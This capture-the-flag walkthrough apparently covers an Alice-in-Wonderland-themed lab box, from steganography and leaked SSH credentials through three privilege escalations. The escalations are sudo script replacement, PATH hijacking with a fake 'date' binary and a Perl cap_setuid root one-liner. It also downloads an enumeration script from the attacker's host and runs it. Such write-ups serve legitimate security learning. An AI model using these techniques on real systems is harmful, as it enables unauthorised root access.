**Target IP:** `10.10.138.89`  
**Open Ports:** `22 (SSH)`, `80 (HTTP)`
[[CTF Notes]]
---
### 🔍 Port Scanning

Initial scan revealed:

- **22** - SSH

- **80** - HTTP

### 📂 Directory Enumeration
Used `gobuster` to enumerate hidden web directories:

```bash
gobuster dir -u http://10.10.138.89 -w /usr/share/wordlists/dirb/common.txt
```

Found:
- `/img`

- `/r`

## 🔎 Enumeration & Initial Access

### 🖼 Steganography

Downloaded `white_rabbit_1.jpg` from `/img`.  
Extracted hidden data using `steghide`:

```bash
steghide extract -sf white_rabbit_1.jpg
```

Found `hint.txt`:

```
"follow the r a b b i t"
```

Manually navigated to:

```
http://10.10.138.89/r/a/b/b/i/t
```

View source revealed SSH credentials:

- **Username:** `alice`
    
- **Password:** `HowDothTheLittleCrocodileImproveHisShiningTail`

## 🔐 SSH Access & User Enumeration

Logged in as Alice:

```bash
ssh alice@10.10.138.89
```

Retrieved **user flag**:

```bash
cat /root/user.txt
```

Explored Alice's home directory and found:

- A Python script printing Alice in Wonderland quotes
    
- A `sudo` permission:

```bash
User alice may run the following command:
(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Replaced the script with a reverse shell:

```python
# walrus_and_the_carpenter.py
import os
os.system("/bin/bash")
```

Executed with elevated permissions:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Now accessed user **rabbit**.

---

## 🧪 Privilege Escalation to Hatter

Found a binary called `teaParty` in `/home/rabbit/`.  
Downloaded it to Kali for analysis:

```bash
# On target
python3 -m http.server 8000

# On Kali
wget http://<IP>:8000/teaParty
```

Ran `strings teaParty` and found:

```bash
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

#### 🧠 Exploit Path Hijacking

Created a fake `date` binary:

```bash
#!/bin/bash
/bin/bash
```

Made it executable:

```bash
chmod +x date
```

Modified the `PATH` so our version is used:

```bash
export PATH=/home/rabbit:$PATH
```

Executed:

```bash
./teaParty
```

---
## 🧨 Final Privilege Escalation (Root)

Found a password file in Hatter’s home:

```bash
/home/hatter/password.txt → WhyIsARavenLikeAWritingDesk?
```

Uploaded **LinEnum.sh** for system enumeration:

```bash
# On Kali
python3 -m http.server 8000

# On target
wget http://<KALI_IP>:8000/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh
```

Found capabilites:

```bash
[+] Files with POSIX capabilities set:
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

Perl has `cap_setuid+ep`, allowing escalation.

#### 💥 Root Shell via Perl

```bash
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Now we have a root shell 

---
## 🏁 Post-Exploitation

Retrieved final flag:

```bash
cat alice/home/root.txt
```

Root Flag:

```
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

---

## ✅ Summary

- Enumeration involved steganography and deep URL paths

- SSH credentials hidden in source

- Multi-user privilege escalation:
    
    - Alice → Rabbit via `sudo python`
        
    - Rabbit → Hatter via PATH hijacking
        
    - Hatter → Root via Perl capabilities
        
- Each step referenced literary quotes/themes from _Alice in Wonderland_

---

## 🧰 Tools Used

- `nmap`, `gobuster`
    
- `steghide`
    
- `strings`
    
- `LinEnum`
    
- `python3 -m http.server`
    
- `perl`, `bash`

---

## 💡 Lessons Learned

- Always inspect web source and image metadata
    
- Steganography can hide initial footholds
    
- PATH hijacking is effective when binaries call other binaries
    
- POSIX capabilities like `cap_setuid` are a great privesc vector









